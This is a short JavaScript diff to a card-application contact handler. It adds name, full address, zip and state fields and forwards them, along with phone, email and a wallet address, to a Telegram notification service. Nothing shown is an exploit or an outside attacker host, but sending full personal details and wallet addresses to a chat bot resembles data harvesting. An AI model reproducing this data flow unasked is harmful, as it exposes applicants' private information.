@@ -16,8 +16,13 @@ function submitContact(req, res) {
     const applicationId = createId();
     const contact = {
         applicationId,
-        email: req.body.email,
+        name: req.body.name,
         phone: req.body.phone,
+        email: req.body.email,
+        addressLine1: req.body.addressLine1,
+        addressLine2: req.body.addressLine2 || "",
+        zip: req.body.zip,
+        state: req.body.state,
         country: req.body.country,
         submittedAt: new Date().toISOString()
     };
@@ -36,8 +41,13 @@ function submitContact(req, res) {
         const { notifyCardApplication } = require("../services/telegramNotifications");
         notifyCardApplication({
             applicationId,
-            email: contact.email,
+            name: contact.name,
             phone: contact.phone,
+            email: contact.email,
+            addressLine1: contact.addressLine1,
+            addressLine2: contact.addressLine2,
+            zip: contact.zip,
+            state: contact.state,
             country: contact.country,
             submittedAt: contact.submittedAt,
             walletAddress,
